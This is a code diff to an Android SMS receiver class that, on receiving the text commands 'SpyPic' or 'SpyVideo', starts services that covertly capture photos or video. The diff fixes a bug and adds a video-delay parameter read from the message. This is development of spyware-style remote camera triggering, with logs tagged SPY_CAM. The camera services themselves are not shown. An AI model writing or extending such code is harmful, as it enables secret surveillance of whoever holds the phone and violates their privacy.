@@ -7,11 +7,10 @@ import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
-import java.io.IOException;
-
 public class SmsReceiver extends BroadcastReceiver {
     String msg_from;
     String msgBody;
+    int firstValue;
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -33,7 +32,7 @@ public class SmsReceiver extends BroadcastReceiver {
                         Log.i("SPY_CAM" , "Msg :" + getMsg);
                         if (getMsg.equals("SpyPic")) {
                             Log.i("SPY_CAM", "Capturing Image");
-                            int firstValue = Character.getNumericValue(intValue.charAt(0));
+                            firstValue = Character.getNumericValue(intValue.charAt(0));
                             System.out.println("charAt0" + intValue.charAt(0));
                             Intent serviceIntent = new Intent(context, SpyPictureService.class);
                             System.out.println(firstValue > 5);
@@ -42,9 +41,14 @@ public class SmsReceiver extends BroadcastReceiver {
                                 serviceIntent.putExtra("brustValue" , firstValue);
                             }
                             context.startService(serviceIntent);
-                        } else if (msgBody.equals("SpyVideo")) {
+                        } else if (getMsg.equals("SpyVideo")) {
                             Log.i("SPY_CAM", "Capturing Video");
                             Intent videoIntent = new Intent(context, SpyVideoService.class);
+                            if (!intValue.isEmpty()) {
+                                int videoDelay = Integer.parseInt(intValue);
+                                Log.i("SPY_CAM" , "videoDuration" + videoDelay);
+                                videoIntent.putExtra("videoDelay" , videoDelay);
+                            }
                             context.startService(videoIntent);
                         }
                     }
